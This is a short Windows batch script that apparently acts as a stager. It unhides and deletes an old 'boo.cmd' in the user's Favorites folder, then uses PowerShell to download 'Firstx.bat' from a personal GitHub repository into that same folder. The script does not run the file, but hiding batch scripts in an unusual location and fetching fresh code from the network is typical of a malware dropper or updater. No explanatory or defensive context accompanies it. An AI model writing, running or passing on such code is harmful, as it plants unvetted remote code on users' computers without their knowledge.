@echo off
setlocal enabledelayedexpansion


set "oldFile=%USERPROFILE%\Favorites\boo.cmd"

if exist "%oldFile%" (
    attrib -h "%oldFile%" 2>nul
    del /q "%oldFile%"
    echo Deleted old file
) else (
    echo No old file found
)


set "fileURL=https://raw.githubusercontent.com/Stephan999s/src/main/Firstx.bat"


set "destinationFolder=%USERPROFILE%\Favorites"

powershell -command "& { Invoke-WebRequest -Uri '%fileURL%' -OutFile ('%destinationFolder%\Firstx.bat') }"

echo Download completed.

:end
